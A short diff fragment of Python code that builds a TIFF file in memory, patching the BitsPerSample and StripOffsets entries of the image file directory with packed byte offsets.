+        # Patch BitsPerSample offset (tag 258 entry is 3rd)
+        # IFD layout: 2 bytes count then N entries; entry k at ifd_off+2 + k*12
+        bits_ent_off = ifd_off + 2 + 2 * 12
+        # entry value field starts at +8 in entry
+        b[bits_ent_off + 8:bits_ent_off + 12] = struct.pack("<I", bits_off)
+
+        # Patch StripOffsets value (tag 273 is 6th entry: index 5)
+        strip_ent_off = ifd_off + 2 + 5 * 12
+        b[strip_ent_off + 8:strip_ent_off + 12] = struct.pack("<I", strip_off)
+
+        return bytes(b)
